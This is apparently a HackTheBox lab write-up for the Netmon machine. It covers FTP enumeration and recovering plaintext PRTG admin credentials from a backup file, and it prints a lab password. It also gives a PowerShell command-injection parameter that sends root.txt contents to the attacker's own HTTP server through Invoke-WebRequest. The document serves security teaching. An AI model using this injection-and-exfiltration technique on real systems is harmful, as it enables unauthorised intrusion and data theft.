---
layout: page
title: HackTheBox Netmon
---

Netmon teaches about vulnerabiities associated with the PRTG Network Monitor. Exploiting this box requires some enumeration knowledge of windows, FTP, some knowledge of PRTG network monitor (lots of googling was done during this challenge), and a little bit of knowledge of powershell. In the method that I used to exploit netmon (that will be shown on this writeup), I also used (and learned how to use by doing this challenge) SimpleHTTPServer on kali linux.

### Enumeration
Doing a simple ```nmap -sC -sV -oA scan 10.10.10.152``` yields the following result:

![image](https://user-images.githubusercontent.com/41026969/55495150-48a5d500-560a-11e9-91e7-17d015735d37.png)

So from running the nmap scan I see that the box is running a windows server and that it is running with something called "PRTG Network Monitor." Also we see that the server allows anonymous access through FTP this means we can type in our username as ```anonymous``` and type in any random password and it'll allow us in as a user... interesting let's check that out:

![image](https://user-images.githubusercontent.com/41026969/55495577-3710fd00-560b-11e9-816a-70dc68f5ae71.png)

So immediately after I ftp'ed in, I did a quick ```ls -la``` check to see all the directories (the ```-la``` puts it in listed format and shows all files) and files.

#### Getting the user flag
I see that there is a ```Users``` directory that I can access. Going into that directory and doing another ```ls``` check reveals two directories: ```Administrator``` and ```Public```. However, doing a ```ls -la``` check to also view hidden directories there a few more that did not show up before, we'll check those out later. (when I initially did this challenge, I just did a ```ls``` check and only knew about the two directories...)

So first I tried changing directory into Administrator directory and failed (got a ```550 access is denied```), so I go into the User ```Public``` and I was able to get in, no access denied, so I did a ```ls -la``` check. Doing so I discovered ```user.txt```! (You can use the ```get``` command within ftp to download the file inside into your host machine, so I did ```get user.txt``` and was able to use ```cat``` to read the file).

### Enumeration continued...
Now onto getting the root flag... I did some more enumerating by going to the box IP: ```10.10.10.152``` and this is the homepage:

![image](https://user-images.githubusercontent.com/41026969/55510156-97179b80-562b-11e9-9b88-d99f33042174.png)

So the homepage confirms that the server is indeed running with PRTG Network Monitor and on the bottom the version number is listed ```PAESSLER PRTG Network Monitor 18.1.37.13956```. I initially tried a bunch of normally default credentials, none worked. I even looked into the PRTG Network Monitor manual and tried the default credentials that is listed and that didn't work... had to do some more googling...

Doing some googling of PRTG Network Monitor, I came across this [reddit thread](https://www.reddit.com/r/sysadmin/comments/862b8s/prtg_gave_away_some_of_your_passwords/) and according to the thread PRTG Network Monitor version 17.4+ can be effected, so it's possible that we can get the administrator creds by looking at some backup files due to the way PRTG Network Monitor stored backups unencrypted.

### Exploitation
Exploitation of this machine can be split up as a two step process. 

#### Part 1 - Getting the Admin credits to the website
So by doing some googling about the PRTG network monitor and some vulnerabilities associated with it, I came across the reddit thread mentioned earlier in this walkthrough that says the credentials are stored somewhere in the backup files. Combing through the directories there are a couple that are associated with PRTG:

first directory: ```/Program Files (x86)/PRTG Network Monitor```

also in that ```Users``` directory from earlier, there were a few hidden users, going through those I found another directory that has to do with PRTG...

second directory: ```/Users/All users/Paessler/PRTG Network Monitor```

Going through both directories, the first one I mentioned didn't have any of the logs mentioned, however the second one does... Doing an ```ls -la``` check reveals the following:  

![image](https://user-images.githubusercontent.com/41026969/55642080-7a02da00-579d-11e9-884b-e7e331d57306.png)

Here, there's a few files that are suspicious: the ```PRTG Configuration.dat```, ```PRTG Configuration.old```, and ```PRTG Configuration.old.bak```. 

After spending some time skimming through the log files, opening ```PRTG Configuratoin.old.bak``` indeed contains credentials in plaintext shown below. (this part took some patience and guidance and a lot of CNTRL + F...)

![image](https://user-images.githubusercontent.com/41026969/55642341-33fa4600-579e-11e9-9a80-4448298a6edb.png)

NOTE: for these credentials... when I first typed them into the site, it turned out it was wrong... Though if you notice in the password it says the year is 2018 but (at the time of writing this writeup/doing this challenge) it's 2019, trying to replace the password to ```PrTg@dmin2019```... it worked!

![image](https://user-images.githubusercontent.com/41026969/55642523-b71b9c00-579e-11e9-8345-1fca6c30eae2.png)

Above is the homepage of logging into PRTG as a system administrator!! Now onto the next part.

#### Part 2 - Getting some code execution to work and getting the root flag

Doing some further googling, I came across a vulnerability discovered that includes the version that I'm working with on [this website](https://www.codewatch.org/blog/?p=453). This vulnerability's attack vector is the notification system used within the website.

Basically according to the article above, there's a notification system within the admin page with some default testing scripts. One of which (the ```.ps1``` script) takes in argument/parameter input without any checks which allows the ability to inject other Powershell code. The notification system can be found under ```Setup > Account Settings > Notifications```. 

Reading the ```.ps1``` file, we need to first supply the name of the .txt file created (which can be anything we want), but we can add powershell code right after to get remote code execution.

The way I found the root flag was to use python's SimpleHTTPServer and use Powershell's ```Invoke-WebRequest``` to get the output from some powershell commands. In this case, my plan was to use ```type``` to output the root.txt file and send it to my SimpleHTTPServer. This had some guess and checking with the ```/Users/Administrator``` directory but eventually I got the root at ```Users/Administrator/Desktop/root.txt```.

To do this, I first edited the ```Email and push notificatoins to Admin``` at the notifications page. Then you can scroll down and turn on the ```Execute Program```. Then you can select the program file ```outfile.ps1``` and add the Powershell inject parameter. The parameter I used was: ```test.txt; Invoke-WebRequest http://10.10.14.4:8000/$(type c:/Users/Administrator/Desktop/root.txt)```. This parameter will basically create a ```test.txt``` file... but then the extra powreshell code makes a webrequest to my IP that reads the ```root.txt```. The notification system is shown below:

![image](https://user-images.githubusercontent.com/41026969/55645043-81c67c80-57a5-11e9-9ad5-f09906225073.png)

(I replaced ```IP``` and ```PORT``` with my IP and port the the SimpleHTTPServer was on.)

Run the SimpleHTTPServer by doing ```python -m SimpleHTTPServer```

Then after, on the PRTG notification page, you can click the checkmark box on the right of ```Email and push notification to Admin``` (the one you just edited) and click the bell icon to run it. After you should get the root flag!

![image](https://user-images.githubusercontent.com/41026969/55645224-04e7d280-57a6-11e9-8bcd-b6ba21759399.png)

NOTE: it places the notification in a queue so you may have to wait a few seconds to a couple minutes...

### Flags
User: ```/Users/Public/user.txt```

Root: ```/Users/Administrator/Desktop/root.txt```